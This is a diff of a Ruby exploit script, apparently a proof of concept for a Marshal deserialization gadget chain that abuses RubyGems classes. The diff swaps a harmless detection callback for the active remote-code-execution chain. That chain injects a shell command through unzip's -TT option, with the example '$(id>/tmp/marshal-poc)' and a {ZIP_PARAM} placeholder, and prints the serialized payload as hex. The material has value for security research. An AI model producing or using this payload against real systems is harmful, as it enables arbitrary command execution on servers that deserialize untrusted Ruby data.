@@ -85,19 +85,11 @@ def create_rce_gadget_chain(rz_url_to_load, zip_param_to_execute)
   return Marshal.dump([Gem::SpecFetcher, to_s_wrapper(create_folder_gadget), to_s_wrapper(exec_gadget)])
 end
 
-def create_detection_gadget_chain(url)
-  call_url_gadget = call_url_and_create_folder(url)
+# replace with parameter that is provided to the zip executable and can contain a command passed to the -TT param (unzip command), for example: "-TmTT=\"$(id>/tmp/marshal-poc)\"any.zip"
+#For example: zip_param_to_execute = "-TmTT=\"$(id>/tmp/marshal-poc)\"any.zip"
+zip_param_to_execute = "{ZIP_PARAM}"
+rce_gadget_chain = create_rce_gadget_chain("rubygems.org/quick/Marshal.4.8/bundler-2.2.27.gemspec.rz", zip_param_to_execute)
 
-  return Marshal.dump([Gem::SpecFetcher, to_s_wrapper(call_url_gadget)])
-end
+puts rce_gadget_chain.unpack("H*")
 
-url = "" # replace with URL to call in the detection gadget, for example: test.example.org/path, url should not have a query (?) component.
-detection_gadget_chain = create_detection_gadget_chain(url)
-
-#zip_param_to_execute = "" # replace with parameter that is provided to the zip executable and can contain a command passed to the -TT param (unzip command), for example: "-TmTT=\"$(id>/tmp/marshal-poc)\"any.zip"
-#rce_gadget_chain = create_rce_gadget_chain("rubygems.org/quick/Marshal.4.8/bundler-2.2.27.gemspec.rz", zip_param_to_execute)
-
-puts "Detection gadget chain using callback URL #{url}:"
-puts detection_gadget_chain.unpack("H*")
-
-#Marshal.load(detection_gadget_chain) # caution: will trigger the detection gadget when uncommented.
+#Marshal.load(rce_gadget_chain) # caution: will trigger the detection gadget when uncommented.
